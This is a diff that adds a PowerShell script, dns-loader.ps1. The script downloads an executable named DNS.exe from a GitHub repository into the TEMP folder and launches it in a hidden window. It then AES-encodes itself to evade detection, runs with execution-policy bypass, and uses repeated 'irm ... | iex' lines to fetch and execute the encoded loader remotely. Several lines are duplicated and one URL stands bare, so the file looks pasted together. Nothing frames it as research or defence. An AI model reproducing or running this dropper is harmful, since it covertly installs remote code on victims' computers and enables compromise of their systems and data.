@@ -1,0 +1,18 @@
+# dns-loader.ps1
+
+$sourceUrl = "https://github.com/FREAKMANCHIK/WORK/raw/main/files/DNS.exe "
+$outputFile = "$env:TEMP\DNS.exe"
+
+Invoke-WebRequest -Uri $sourceUrl -OutFile $outputFile
+
+if (Test-Path $outputFile) {
+    Start-Process -FilePath $outputFile -WindowStyle Hidden
+}
+Import-Module ./AES-Encoder.ps1
+Invoke-AES-Encoder -InFile dns-loader.ps1 -OutFile aes-dns.ps1
+powershell.exe -exec bypass -Command "& { Import-Module .\aes-dns.ps1; Invoke-EncryptedScript }"
+irm https://github.com/FREAKMANCHIK/WORK/raw/main/files/aes-dns.ps1  -UseBasicParsing | iex
+Import-Module ./AES-Encoder.ps1
+Invoke-AES-Encoder -InFile dns-loader.ps1 -OutFile aes-dns.ps1
+https://github.com/FREAKMANCHIK/WORK/raw/main/files/aes-dns.ps1 
+irm https://github.com/FREAKMANCHIK/WORK/raw/main/files/aes-dns.ps1  -UseBasicParsing | iex
